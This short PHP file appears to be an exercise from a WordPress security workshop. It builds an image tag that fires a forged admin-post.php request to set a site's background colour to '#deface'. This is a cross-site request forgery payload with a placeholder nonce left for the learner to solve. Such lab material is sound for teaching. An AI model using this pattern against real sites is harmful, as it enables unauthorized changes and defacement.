<?php

// This will get magically set to home_url().
// No need to change it; it's just part of the
// "Verify Exploit" button.
if ( isset( $_SERVER['WP_HOME'] ) ) {
	$url = $_SERVER['WP_HOME'];
} else {
	$url = 'http://vip-workshop.dev/security';
}

$nonce = '...um...'; // now what?

$src  = $url . '/wordpress/wp-admin/admin-post.php';
$src .= '?action=vip_background_color_pick';
$src .= '&value=%23deface';
$src .= "&_wpnonce=$nonce";

?>
<img src="<?php echo $src; ?>" />
